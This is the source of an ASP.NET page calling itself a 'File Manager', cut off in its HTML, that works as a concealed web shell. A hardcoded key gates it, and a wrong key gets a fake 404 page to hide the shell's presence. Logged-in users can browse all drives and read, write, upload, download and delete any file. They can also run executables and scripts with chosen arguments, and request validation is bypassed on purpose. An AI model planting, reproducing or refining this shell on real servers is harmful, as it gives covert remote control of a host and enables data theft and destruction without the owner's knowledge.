<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
// ============================================================
// CONFIGURATION  -- only section you should ever need to edit
// ============================================================
private const string SERVER_KEY     = "MyS3cr3tServerK3y!"; // change this
private const int    EXEC_TIMEOUT_MS = 5000;                 // process wait time
private static readonly string[] EXE_EXTENSIONS =
    { ".exe", ".bat", ".cmd", ".ps1", ".sh" };

// ============================================================
// AES-256-CBC TRANSPORT LAYER
// All file paths in the listing are encrypted so they cannot
// be tampered with or guessed from outside the session.
// Content is NOT AES'd -- it uses Base64 via prepSave() to
// safely bypass ASP.NET request validation.
// ============================================================
private static byte[] DeriveKey(string sessionKey)
{
    using (var sha = SHA256.Create())
        return sha.ComputeHash(Encoding.UTF8.GetBytes(sessionKey));
}

private static string AesEncrypt(string plain, string key)
{
    if (string.IsNullOrEmpty(plain)) return "";
    using (var aes = Aes.Create())
    {
        aes.Key = DeriveKey(key); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
        aes.GenerateIV();
        using (var enc = aes.CreateEncryptor())
        {
            byte[] ct  = enc.TransformFinalBlock(Encoding.UTF8.GetBytes(plain), 0, Encoding.UTF8.GetBytes(plain).Length);
            byte[] outBytes = new byte[16 + ct.Length];
            System.Buffer.BlockCopy(aes.IV, 0, outBytes, 0,  16);
            System.Buffer.BlockCopy(ct,     0, outBytes, 16, ct.Length);
            return Convert.ToBase64String(outBytes);
        }
    }
}

private static string AesDecrypt(string cipherB64, string key)
{
    if (string.IsNullOrEmpty(cipherB64)) return "";
    try
    {
        byte[] data = Convert.FromBase64String(cipherB64);
        byte[] iv   = new byte[16];
        byte[] body = new byte[data.Length - 16];
        System.Buffer.BlockCopy(data, 0,  iv,   0, 16);
        System.Buffer.BlockCopy(data, 16, body, 0, body.Length);
        using (var aes = Aes.Create())
        {
            aes.Key = DeriveKey(key); aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
            using (var dec = aes.CreateDecryptor())
                return Encoding.UTF8.GetString(dec.TransformFinalBlock(body, 0, body.Length));
        }
    }
    catch { return ""; }
}

// URL-safe Base64: replaces +/= so values are safe in HTML attrs and JS strings
private static string ToSafe(string b64)   { return b64.Replace('+', '-').Replace('/', '_').Replace("=", ""); }
private static string FromSafe(string safe)
{
    string b64 = safe.Replace('-', '+').Replace('_', '/');
    int pad = b64.Length % 4;
    if (pad == 2) b64 += "=="; else if (pad == 3) b64 += "=";
    return b64;
}

// Shorthand encrypt/decrypt using the current session key
private string Enc(string s) { return ToSafe(AesEncrypt(s, SKey())); }
private string Dec(string s) { return AesDecrypt(FromSafe(s), SKey()); }

// ============================================================
// SESSION HELPERS
// ============================================================
private bool   IsAuth()  { return Session["auth"] as string == "1"; }
private string SKey()    { return Session["skey"] as string ?? ""; }
private string GetSess(string k, string def = "") { return Session[k] as string ?? def; }
private void   SetSess(string k, string v)        { Session[k] = v; }
private void   DelSess(params string[] keys)      { foreach (var k in keys) Session.Remove(k); }

// Read a raw form field (hidden inputs set by JS)
private string F(string k) { return (Request.Form[k] ?? "").Trim(); }

// ============================================================
// AUTH
// ============================================================
private static string MakeSessionKey(string userKey)
{
    using (var sha = SHA256.Create())
    {
        var hash = sha.ComputeHash(Encoding.UTF8.GetBytes(userKey + SERVER_KEY));
        var sb   = new StringBuilder(64);
        foreach (byte b in hash) sb.AppendFormat("{0:x2}", b);
        return sb.ToString();
    }
}

private void Require() { if (!IsAuth()) Send404(); }

private void Send404()
{
    Response.Clear();
    Response.StatusCode = 404; Response.StatusDescription = "Not Found";
    Response.ContentType = "text/html";
    Response.Write("<html><body><h1>404 Not Found</h1></body></html>");
    Response.End();
}

// ============================================================
// CURRENT WORKING DIRECTORY
// ============================================================
private string CWD
{
    get
    {
        string d = GetSess("cwd");
        if (string.IsNullOrEmpty(d) || !Directory.Exists(d))
        { d = Server.MapPath("~"); SetSess("cwd", d); }
        return d;
    }
    set { SetSess("cwd", value); }
}

// Resolve a path that may be absolute or relative to CWD
private string Resolve(string path)
{
    if (string.IsNullOrEmpty(path)) return "";
    string r = Path.IsPathRooted(path) ? path : Path.GetFullPath(Path.Combine(CWD, path));
    r = r.TrimEnd('\\', '/');
    if (r.Length == 2 && r[1] == ':') r += "\\";  // bare drive e.g. "C:"
    return r;
}

// Open a file into the editor and switch to editor panel
private void OpenInEditor(string fullPath)
{
    SetSess("editorContent", File.ReadAllText(fullPath, Encoding.UTF8));
    SetSess("openFile", fullPath);
    SetSess("panel", "editor");
}

// ============================================================
// PAGE LIFECYCLE
// ============================================================
protected void Page_Load(object sender, EventArgs e)
{
    bool auth = IsAuth();
    PanelLogin.Visible = !auth;
    PanelApp.Visible   =  auth;
    if (auth && !IsPostBack) RenderListing();
}

// Row-button routing runs in PreLoad so it fires before any Click handler.
// The listing buttons don't map to asp:Buttons -- they use plain hidden fields.
protected override void OnPreLoad(EventArgs e)
{
    base.OnPreLoad(e);
    if (!IsPostBack || !IsAuth()) return;

    string cd = F("__CDDIR");
    if (!string.IsNullOrEmpty(cd))
    {
        string dir = Dec(cd);
        if (Directory.Exists(dir)) { CWD = dir; RenderListing(); Msg("Entered: " + dir, "ok"); }
        return;
    }

    string rf = F("__RDFILE");
    if (!string.IsNullOrEmpty(rf))
    {
        string fp = Dec(rf);
        if (File.Exists(fp))
        {
            try   { OpenInEditor(fp); RenderListing(); Msg("Read: " + fp, "ok"); }
            catch (Exception ex) { Msg("Read error: " + ex.Message, "err"); }
        }
        return;
    }

    string rx = F("__RUNEXE");
    if (!string.IsNullOrEmpty(rx))
    {
        string rp = Dec(rx);
        if (!string.IsNullOrEmpty(rp))
        {
            SetSess("runExe", rp); SetSess("panel", "exec");
            TxtExeArgs.Text = "";
            RenderListing();
            Msg("Ready to run: " + Path.GetFileName(rp), "info");
        }
        return;
    }

    string dx = F("__DELFILE");
    if (!string.IsNullOrEmpty(dx))
    {
        string fp = Dec(dx);
        if (!string.IsNullOrEmpty(fp) && File.Exists(fp))
        {
            try
            {
                File.Delete(fp);
                // If the deleted file was open in the editor, clear it
                if (GetSess("openFile") == fp)
                    DelSess("openFile", "editorContent", "panel", "newFile");
                RenderListing();
                Msg("Deleted: " + fp, "ok");
            }
            catch (Exception ex) { Msg("Delete error: " + ex.Message, "err"); }
        }
        else
        {
            Msg("File not found or already deleted.", "err");
        }
        return;
    }

    // Handle download early so Response.End() fires before the page lifecycle starts rendering.
    string dl = F("hDownloadPath");
    if (!string.IsNullOrEmpty(dl))
    {
        string fp = Dec(dl);
        if (!string.IsNullOrEmpty(fp) && File.Exists(fp))
        {
            try
            {
                byte[] data  = File.ReadAllBytes(fp);
                string fname = Path.GetFileName(fp);
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition", "attachment; filename=\"" + fname + "\"");
                Response.AddHeader("Content-Length", data.Length.ToString());
                Response.BinaryWrite(data); Response.Flush(); Response.End();
            }
            catch { /* fall through to normal page load if anything goes wrong */ }
        }
    }
}

// ============================================================
// AUTH HANDLERS
// ============================================================
protected void BtnLogin_Click(object sender, EventArgs e)
{
    string key = TxtUserKey.Text.Trim();
    if (string.IsNullOrEmpty(key)) { LblLoginErr.Text = "Enter a key."; LblLoginErr.Visible = true; return; }
    if (key != SERVER_KEY) { Send404(); return; }
    SetSess("auth", "1");
    SetSess("skey", MakeSessionKey(key));
    PanelLogin.Visible = false; PanelApp.Visible = true;
    RenderListing();
}

protected void BtnLogout_Click(object sender, EventArgs e)
{
    Session.Clear();
    Response.Redirect(Request.Url.AbsolutePath);
}

// ============================================================
// FILE OPERATION HANDLERS
// ============================================================
protected void BtnGo_Click(object sender, EventArgs e)
{
    Require();
    string dir = Resolve(Dec(F("hPath")));
    if (string.IsNullOrEmpty(dir)) { Msg("Enter a path.", "err"); return; }
    if (!Directory.Exists(dir))   { Msg("Not found: " + dir, "err"); return; }
    CWD = dir; RenderListing(); Msg("Directory: " + dir, "ok");
}

protected void BtnRead_Click(object sender, EventArgs e)
{
    Require();
    string fp = Resolve(Dec(F("hFilename")));
    if (!File.Exists(fp)) { Msg("File not found: " + fp, "err"); return; }
    try   { OpenInEditor(fp); RenderListing(); Msg("Read: " + fp, "ok"); }
    catch (Exception ex) { Msg("Read error: " + ex.Message, "err"); }
}

protected void BtnWrite_Click(object sender, EventArgs e)
{
    Require();
    // Filename comes from the plain hidden field set by JS prepSave(),
    // falling back to the session-stored open file path.
    string fname = F("hFilenamePlain");
    if (string.IsNullOrEmpty(fname)) fname = GetSess("openFile");
    if (string.IsNullOrEmpty(fname)) { Msg("Enter a filename.", "err"); return; }

    string full = Resolve(fname);

    // Content is base64-encoded by prepSave() into hContentPlain and read via
    // Request.Unvalidated so ASP.NET pipeline validation never sees raw HTML/script.
    string b64 = (Request.Unvalidated.Form["hContentPlain"] ?? "").Trim();
    string body = "";
    if (!string.IsNullOrEmpty(b64))
    {
        try   { body = Encoding.UTF8.GetString(Convert.FromBase64String(b64)); }
        catch { body = b64; }
    }

    try
    {
        File.WriteAllText(full, body, Encoding.UTF8);
        SetSess("openFile", full); DelSess("newFile");
        Msg("Saved: " + full, "ok"); RenderListing();
    }
    catch (Exception ex) { Msg("Write error: " + ex.Message, "err"); }
}

protected void BtnNew_Click(object sender, EventArgs e)
{
    Require();
    DelSess("openFile", "editorContent");
    SetSess("panel", "editor"); SetSess("newFile", "1");
    Msg("New file - enter a name and content, then Save.", "info");
}

protected void BtnCancelEdit_Click(object sender, EventArgs e)
{
    DelSess("openFile", "panel", "newFile", "editorContent");
}

protected void BtnUp_Click(object sender, EventArgs e)
{
    Require();
    var parent = Directory.GetParent(CWD);
    if (parent != null) { CWD = parent.FullName; RenderListing(); Msg("Up to: " + CWD, "ok"); }
    else Msg("Already at root.", "info");
}

protected void BtnUpload_Click(object sender, EventArgs e)
{
    Require();
    if (!FileUpload1.HasFile) { Msg("No file selected.", "err"); return; }
    try
    {
        string dest = Path.Combine(CWD, Path.GetFileName(FileUpload1.FileName));
        FileUpload1.SaveAs(dest);
        Msg("Uploaded: " + Path.GetFileName(dest), "ok"); RenderListing();
    }
    catch (Exception ex) { Msg("Upload error: " + ex.Message, "err"); }
}

protected void BtnDownload_Click(object sender, EventArgs e)
{
    Require();
    string fp = Dec(F("hDownloadPath"));
    if (string.IsNullOrEmpty(fp) || !File.Exists(fp)) { Msg("File not found.", "err"); return; }
    try
    {
        byte[] data  = File.ReadAllBytes(fp);
        string fname = Path.GetFileName(fp);
        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition", "attachment; filename=\"" + fname + "\"");
        Response.AddHeader("Content-Length", data.Length.ToString());
        Response.BinaryWrite(data); Response.Flush(); Response.End();
    }
    catch (Exception ex) { Msg("Download error: " + ex.Message, "err"); }
}

protected void BtnExec_Click(object sender, EventArgs e)
{
    Require();
    string _hExePath     = F("hExePath");
    string _hExePlain    = F("hExePathPlain");
    string _sessRunExe   = GetSess("runExe");
    string _decrypted    = Dec(_hExePath);
    // Show debug so we can see exactly what arrived
    Msg("DBG hExePath=" + (_hExePath.Length > 0 ? _hExePath.Substring(0,Math.Min(12,_hExePath.Length))+"..." : "(empty)") +
        " | plain=" + (_hExePlain.Length > 0 ? _hExePlain.Substring(0,Math.Min(20,_hExePlain.Length)) : "(empty)") +
        " | sess=" + (_sessRunExe.Length > 0 ? _sessRunExe.Substring(0,Math.Min(20,_sessRunExe.Length)) : "(empty)") +
        " | dec=" + (_decrypted.Length > 0 ? _decrypted.Substring(0,Math.Min(20,_decrypted.Length)) : "(empty)"), "info");
    // Priority: session (most reliable) > plain field > decrypted
    string fp = _sessRunExe;
    if (string.IsNullOrEmpty(fp)) fp = _hExePlain;
    if (string.IsNullOrEmpty(fp)) fp = _decrypted;
    if (string.IsNullOrEmpty(fp) || !File.Exists(fp)) { Msg("Executable not found. fp=" + fp, "err"); return; }

    try
    {
        var psi = new ProcessStartInfo
        {
            FileName = fp, Arguments = TxtExeArgs.Text,
            WorkingDirectory       = Path.GetDirectoryName(fp),
            RedirectStandardOutput = true, RedirectStandardError = true,
            UseShellExecute = false, CreateNoWindow = true
        };
        var proc = new Process { StartInfo = psi };
        proc.Start();
        // Read stdout and stderr asynchronously BEFORE WaitForExit to prevent
        // deadlock: if the process fills the output buffer it blocks waiting for
        // a reader, while WaitForExit blocks waiting for the process -- deadlock.
        var stdoutTask = System.Threading.Tasks.Task.Run(() => proc.StandardOutput.ReadToEnd());
        var stderrTask = System.Threading.Tasks.Task.Run(() => proc.StandardError.ReadToEnd());
        bool done   = proc.WaitForExit(EXEC_TIMEOUT_MS);
        string out_ = stdoutTask.Result;
        string err_ = stderrTask.Result;

        var sb = new StringBuilder();
        sb.AppendLine("=== " + fp + " " + TxtExeArgs.Text);
        sb.AppendLine("=== Exit: " + (done ? proc.ExitCode.ToString() : "timeout") + " ===");
        if (!string.IsNullOrEmpty(out_)) sb.AppendLine(out_);
        if (!string.IsNullOrEmpty(err_)) { sb.AppendLine("--- STDERR ---"); sb.AppendLine(err_); }
        if (!done) sb.AppendLine("(Process still running - output captured so far)");

        string output = sb.ToString();
                LitExecOutput.Text        = Server.HtmlEncode(output).Replace("\r", "").Replace("\n", "<br/>");
        PanelExecResult.Visible   = true;
        SetSess("panel", "exec");
        RenderListing();
        Msg("Executed: " + Path.GetFileName(fp) + (done ? " (exit " + proc.ExitCode + ")" : " (timeout)"),
            done && proc.ExitCode == 0 ? "ok" : "err");
    }
    catch (Exception ex)
    {
        string output = "ERROR: " + ex.Message;
                LitExecOutput.Text        = Server.HtmlEncode(output);
        PanelExecResult.Visible   = true;
        SetSess("panel","exec");
        RenderListing();
        Msg("Exec failed: " + ex.Message, "err");
    }
}

protected void BtnCancelExec_Click(object sender, EventArgs e)
{
    DelSess("runExe", "panel");
    TxtExeArgs.Text = "";
}

// ============================================================
// FILE LISTING
// ============================================================
private static readonly System.Collections.Generic.HashSet<string> _exeExts =
    new System.Collections.Generic.HashSet<string>(EXE_EXTENSIONS, StringComparer.OrdinalIgnoreCase);

private void RenderListing()
{
    LblCwd.Text = Server.HtmlEncode(CWD);
    var sb = new StringBuilder();

    // Drives
    try
    {
        foreach (var drv in DriveInfo.GetDrives())
        {
            if (!drv.IsReady && drv.DriveType != DriveType.Fixed) continue;
            sb.Append(EntryRow("entry-drive", "&#128190;", drv.Name, "", Enc(drv.RootDirectory.FullName), false));
        }
    }
    catch { }

    // Directories
    try
    {
        foreach (string d in Directory.GetDirectories(CWD))
        {
            var di = new DirectoryInfo(d);
            sb.Append(EntryRow("entry-dir", "&#128193;", di.Name, "", Enc(di.FullName), false));
        }
    }
    catch { sb.Append("<div class='entry-err'>Cannot list directories.</div>"); }

    // Files
    try
    {
        foreach (string f in Directory.GetFiles(CWD))
        {
            var fi    = new FileInfo(f);
            bool isEx = _exeExts.Contains(fi.Extension);
            sb.Append(EntryRow(isEx ? "entry-exe" : "entry-file",
                               isEx ? "&#9881;"   : "&#128196;",
                               fi.Name, FmtBytes(fi.Length), Enc(fi.FullName), isEx));
        }
    }
    catch { sb.Append("<div class='entry-err'>Cannot list files.</div>"); }

    LitListing.Text = sb.ToString();
}

// Build a single listing row -- keeps RenderListing readable
private string EntryRow(string cls, string icon, string name, string meta, string enc, bool isExe)
{
    string safe = Server.HtmlEncode(name);
    bool   isFile = cls == "entry-file" || isExe;
    // Drive/dir rows are clickable (cd); file rows open on click too (read)
    string click = isFile
        ? "onclick='readFile(\"" + enc + "\")'"
        : "onclick='cdDir(\"" + enc + "\")'";

    string actions = "";
    if (isFile)
    {
        actions  = "<span class='entry-actions'>";
        actions += "<button class='act-btn' title='Read' onclick='event.stopPropagation();readFile(\"" + enc + "\")'>&#128065;</button>";
        actions += "<button class='act-btn act-dl' title='Download' onclick='event.stopPropagation();downloadFile(\"" + enc + "\")'>&#8659;</button>";
        if (isExe)
            actions += "<button class='act-btn act-run' title='Run' onclick='event.stopPropagation();runExe(\"" + enc + "\")'>&#9654;</button>";
        actions += "<button class='act-btn act-del' title='Delete' onclick='event.stopPropagation();deleteFile(\"" + enc + "\",\"" + safe + "\")'>&#128465;</button>";
        actions += "</span>";
    }

    return string.Format(
        "<div class='entry {0}' {1}>" +
        "<span class='entry-icon'>{2}</span>" +
        "<span class='entry-name' title='{3}'>{3}</span>" +
        "<span class='entry-meta'>{4}</span>" +
        "{5}</div>",
        cls, click, icon, safe, meta, actions);
}

// ============================================================
// VIEW HELPERS  (called from inline <%= %> expressions)
// ============================================================
private static string FmtBytes(long b)
{
    if (b < 1024)    return b + "B";
    if (b < 1048576) return (b / 1024.0).ToString("0.0") + "KB";
    return (b / 1048576.0).ToString("0.0") + "MB";
}

// Escape a string for safe use inside a JS single-quoted string literal
private static string JsStr(string s)
{
    if (string.IsNullOrEmpty(s)) return "";
    char bs = (char)92; char sq = (char)39;
    return s.Replace(bs.ToString(), bs.ToString() + bs.ToString())
            .Replace(sq.ToString(), (char)92 + sq.ToString());
}

private void Msg(string text, string kind)
{
    LblMsg.Text     = Server.HtmlEncode(text);
    LblMsg.CssClass = "topbar-msg msg-" + kind;
    LblMsg.Visible  = true;
}

// Inline view helpers used in <%=  %> expressions in the HTML below
protected string OpenFilePath()   { return Server.HtmlEncode(GetSess("openFile")); }
protected string EditorContent()  { return Server.HtmlEncode(GetSess("editorContent")); }
protected string RunExePath()     { return Server.HtmlEncode(GetSess("runExe")); }
protected string OpenFilePathJS() { return JsStr(GetSess("openFile")); }
protected string RunExePathJS()   { return JsStr(GetSess("runExe")); }
protected string ActivePanel()    { return GetSess("panel", "none"); }
protected bool   IsNewFile()      { return GetSess("newFile") == "1"; }
protected string AuthSKey()       { return IsAuth() ? SKey() : ""; }
</script>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>File Manager</title>
<style>
/* ── Design tokens ───────────────────────────────────────── */
:root {
  --bg:      #0d0f14; --surface: #13161e; --surface2: #1a1e2a;
  --border:  #252a38; --border2: #2e3448;
  --accent:  #4f9eff; --accent2: #7b61ff;
  --ok:      #22d392; --err: #ff5f5f; --info: #f0c040; --run: #ff9f40;
  --text:    #d4daf0; --muted: #606880; --dim: #3a3f55;
  --mono:    'Courier New', monospace;
  --sans:    'Segoe UI', system-ui, sans-serif;
  --sidebar: 260px; --hdr: 48px;
}
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; overflow: hidden; }
body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 13px; display: flex; flex-direction: column; }
input[type=hidden] { display: none !important; }

/* ── Login ───────────────────────────────────────────────── */
.login-wrap { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.login-box  { background: var(--surface); border: 1px solid var(--border); border-radius: 12px;
              padding: 36px 40px; width: 360px; display: flex; flex-direction: column; gap: 18px; }
.login-title { font-size: 1.2rem; font-weight: 700; text-align: center;
               background: linear-gradient(90deg,var(--accent),var(--accent2));
               -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
.login-sub  { font-size: 12px; color: var(--muted); text-align: center; margin-top: -10px; }
.login-field { display: flex; flex-direction: column; gap: 6px; }
.login-field label { font-size: 12px; color: var(--muted); }
.login-field input { background: var(--surface2); border: 1px solid var(--border); color: var(--text);
  border-radius: 7px; padding: 9px 12px; font-size: 14px; font-family: var(--mono);
  outline: none; width: 100%; letter-spacing: .1em; transition: border-color .15s; }
.login-field input:focus { border-color: var(--accent); }
.login-err  { color: var(--err); font-size: 12px; text-align: center; }
.btn-login  { background: linear-gradient(90deg,var(--accent),var(--accent2)); color: #fff;
  border: none; border-radius: 7px; padding: 10px; font-size: 14px; font-weight: 700;
  cursor: pointer; width: 100%; transition: opacity .15s; }
.btn-login:hover { opacity: .88; }

/* ── Top bar ─────────────────────────────────────────────── */
.topbar { height: var(--hdr); background: var(--surface); border-bottom: 1px solid var(--border);
  display: flex; align-items: center; gap: 10px; padding: 0 14px; flex-shrink: 0; z-index: 10; }
.topbar-logo { font-weight: 700; font-size: 14px; letter-spacing: .04em; white-space: nowrap;
  background: linear-gradient(90deg,var(--accent),var(--accent2));
  -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
.topbar-path { font-family: var(--mono); font-size: 11px; color: var(--muted); flex: 1;
  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
  background: var(--surface2); border: 1px solid var(--border); border-radius: 5px; padding: 3px 8px; }
.topbar-msg  { font-size: 11px; padding: 3px 10px; border-radius: 5px; white-space: nowrap;
  max-width: 400px; overflow: hidden; text-overflow: ellipsis; }
.msg-ok   { background:#0a2a1e; border:1px solid #1e5040; color:var(--ok);   }
.msg-err  { background:#2a0e0e; border:1px solid #5a2020; color:var(--err);  }
.msg-info { background:#2a2208; border:1px solid #5a4a10; color:var(--info); }
.btn-logout { background:none; border:1px solid var(--border); color:var(--muted);
  border-radius:5px; padding:3px 10px; font-size:11px; cursor:pointer; white-space:nowrap; }
.btn-logout:hover { color:var(--err); border-color:var(--err); }

/* ── App layout ──────────────────────────────────────────── */
.layout { display: flex; flex: 1; overflow: hidden; height: calc(100vh - var(--hdr)); min-height: 0; }

/* ── Sidebar ─────────────────────────────────────────────── */
.sidebar { width: var(--sidebar); min-width: var(--sidebar); max-width: var(--sidebar);
  background: var(--surface); border-right: 1px solid var(--border);
  display: flex; flex-direction: column; overflow: hidden; height: 100%; }
.sidebar-nav    { display: flex; gap: 4px; padding: 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
.sidebar-search { padding: 6px 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; }
.sidebar-search input { width: 100%; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 4px 8px; font-size: 12px; font-family: var(--mono); outline: none; }
.sidebar-search input:focus { border-color: var(--accent); }
.sidebar-upload { display: flex; gap: 4px; padding: 6px 8px; border-bottom: 1px solid var(--border); flex-shrink: 0; align-items: center; }
.sidebar-list   { flex: 1; overflow-y: scroll; overflow-x: hidden; padding: 4px 0; min-height: 0; }
.cd-row         { display: flex; gap: 4px; padding: 6px 8px; flex-shrink: 0; border-top: 1px solid var(--border); }
.cd-row input   { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 4px 8px; font-family: var(--mono); font-size: 11px; outline: none; }
.cd-row input:focus { border-color: var(--accent); }
.upload-input { flex: 1; min-width: 0; font-size: 11px; color: var(--muted);
  background: var(--surface2); border: 1px solid var(--border); border-radius: 5px;
  padding: 3px 6px; cursor: pointer; overflow: hidden; }
.upload-input::-webkit-file-upload-button { background: var(--surface); border: 1px solid var(--border);
  color: var(--muted); border-radius: 4px; padding: 2px 6px; font-size: 10px; cursor: pointer; }

/* ── File entries ────────────────────────────────────────── */
.entry { display: flex; align-items: center; gap: 6px; padding: 4px 8px; cursor: pointer;
  border-radius: 4px; margin: 0 4px; transition: background .1s; user-select: none; min-height: 28px; }
.entry:hover { background: var(--surface2); }
.entry-icon    { font-size: 13px; flex-shrink: 0; width: 16px; text-align: center; }
.entry-name    { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 12px; }
.entry-meta    { font-size: 10px; color: var(--muted); flex-shrink: 0; }
.entry-actions { display: flex; gap: 3px; flex-shrink: 0; opacity: 0; transition: opacity .15s; }
.entry:hover .entry-actions { opacity: 1; }
.entry-drive .entry-name { color: var(--accent2); font-weight: 600; }
.entry-dir   .entry-name { color: var(--accent); }
.entry-exe   .entry-name { color: var(--run); }
.entry-file  .entry-name { color: var(--text); }
.entry-err  { color: var(--err); font-size: 11px; padding: 6px 10px; font-style: italic; }
.act-btn    { background: transparent; border: none; color: var(--muted);
  border-radius: 4px; padding: 2px 5px; font-size: 13px; cursor: pointer;
  transition: color .1s, background .1s; line-height: 1; }
.act-btn:hover     { color: var(--accent); background: var(--surface2); }
.act-run:hover     { color: var(--run);    background: var(--surface2); }
.act-dl:hover      { color: var(--ok);     background: var(--surface2); }
.act-del:hover     { color: var(--err);    background: var(--surface2); }

/* ── Resize handle ───────────────────────────────────────── */
.resize-handle { width: 4px; background: transparent; cursor: col-resize; flex-shrink: 0; transition: background .15s; }
.resize-handle:hover, .resize-handle.dragging { background: var(--accent); }

/* ── Main panel ──────────────────────────────────────────── */
.main       { flex: 1; overflow: hidden; display: flex; flex-direction: column; min-width: 0; }
.panel-tabs { display: flex; gap: 1px; background: var(--border); flex-shrink: 0; }
.tab        { padding: 8px 16px; font-size: 12px; font-weight: 600; color: var(--muted);
  cursor: pointer; background: var(--surface2); border: none;
  transition: color .1s, background .1s; display: flex; align-items: center; gap: 6px; }
.tab:hover  { color: var(--text); background: var(--surface); }
.tab.active { color: var(--text); background: var(--bg); }
.tab .tab-x { font-size: 10px; color: var(--muted); margin-left: 4px; }
.tab:hover .tab-x { color: var(--err); }
.panel-body { flex: 1; overflow-y: auto; display: flex; flex-direction: column; padding: 14px; background: var(--bg); min-height: 0; }
.panel-body.panel-hidden { display: none !important; }
.panel-welcome { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--dim); gap: 10px; }
.panel-welcome svg { opacity: .25; }

/* ── Editor ──────────────────────────────────────────────── */
.editor-topbar { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-shrink: 0; }
.editor-topbar input { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.editor-topbar input:focus { border-color: var(--accent); }
textarea.editor { flex: 1; min-height: 300px; background: var(--surface2); border: 1px solid var(--border);
  color: #c8d4f0; border-radius: 6px; padding: 10px; font-family: var(--mono);
  font-size: 12px; line-height: 1.6; resize: vertical; outline: none; transition: border-color .15s; }
textarea.editor:focus { border-color: var(--accent); }
.editor-actions { display: flex; gap: 8px; margin-top: 10px; flex-shrink: 0; }

/* ── Execute panel ───────────────────────────────────────── */
.exec-topbar  { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; flex-shrink: 0; }
.exec-path    { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--run); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.exec-args-row { display: flex; gap: 8px; margin-bottom: 10px; flex-shrink: 0; align-items: center; }
.exec-args-row label { font-size: 11px; color: var(--muted); white-space: nowrap; }
.exec-args-row input { flex: 1; background: var(--surface2); border: 1px solid var(--border);
  color: var(--text); border-radius: 5px; padding: 5px 10px; font-family: var(--mono); font-size: 12px; outline: none; }
.exec-args-row input:focus { border-color: var(--accent); }
textarea.console { flex: 1; min-height: 300px; max-height: 420px; background: #050810; border: 1px solid var(--border);
  color: #7dff9a; border-radius: 6px; padding: 10px; font-family: var(--mono); font-size: 12px; line-height: 1.55; resize: vertical; overflow-y: auto; outline: none; }
pre.console     { flex: 1; min-height: 60px; max-height: 420px; background: #050810; border: 1px solid var(--border);
  color: #7dff9a; border-radius: 6px; padding: 10px; font-family: var(--mono); font-size: 12px; line-height: 1.55; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
.exec-actions { display: flex; gap: 8px; margin-top: 10px; flex-shrink: 0; }

/* ── Buttons ─────────────────────────────────────────────── */
.btn         { display: inline-flex; align-items: center; gap: 5px; padding: 5px 12px; border: none;
  border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer;
  transition: filter .15s, transform .1s; white-space: nowrap; }
.btn:active  { transform: scale(.97); }
.btn:hover   { filter: brightness(1.12); }
.btn-sm      { padding: 3px 9px; font-size: 11px; }
.btn-primary { background: var(--accent);   color: #fff; }
.btn-ghost   { background: var(--surface2); color: var(--text); border: 1px solid var(--border); }
.btn-danger  { background: #3a1a1a; color: var(--err); border: 1px solid #5a2a2a; }
.btn-success { background: #0e3028; color: var(--ok);  border: 1px solid #1e5040; }
.btn-run     { background: #2a1e08; color: var(--run); border: 1px solid #5a3e10; }

/* ── Scrollbar ───────────────────────────────────────────── */
::-webkit-scrollbar { width: 5px; height: 5px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--muted); }
</style>
</head>
<body>
<form id="fm" runat="server">

  <%-- Hidden transport fields. Set by JS before postback; read via Request.Form on server. --%>
  <input type="hidden" name="__CDDIR"        id="hCdDir"    />
  <input type="hidden" name="__RDFILE"        id="hRdFile"   />
  <input type="hidden" name="__RUNEXE"        id="hRunExe"   />
  <input type="hidden" name="__DELFILE"       id="hDelFile"  />
  <input type="hidden" name="hPath"           id="hPath"     />
  <input type="hidden" name="hFilename"       id="hFilename" />
  <input type="hidden" name="hExePath"        id="hExePath"  />
  <input type="hidden" name="hDownloadPath"   id="hDlPath"      />
  <input type="hidden" name="hExePathPlain"  id="hExePathPlain" />
  <input type="hidden" name="hFilenamePlain"  id="hFnPlain"  />
  <input type="hidden" name="hContentPlain"   id="hConPlain" />

  <%-- LOGIN --%>
  <asp:Panel ID="PanelLogin" runat="server">
    <div class="login-wrap">
      <div class="login-box">
        <div class="login-title">&#128193; File Manager</div>
        <div class="login-sub">Enter your access key to continue</div>
        <div class="login-field">
          <label>Access Key</label>
          <asp:TextBox ID="TxtUserKey" runat="server" TextMode="Password" placeholder="••••••••"/>
        </div>
        <asp:Label  ID="LblLoginErr" runat="server" Visible="false" CssClass="login-err"/>
        <asp:Button ID="BtnLogin"    runat="server" Text="Unlock" CssClass="btn-login" OnClick="BtnLogin_Click"/>
      </div>
    </div>
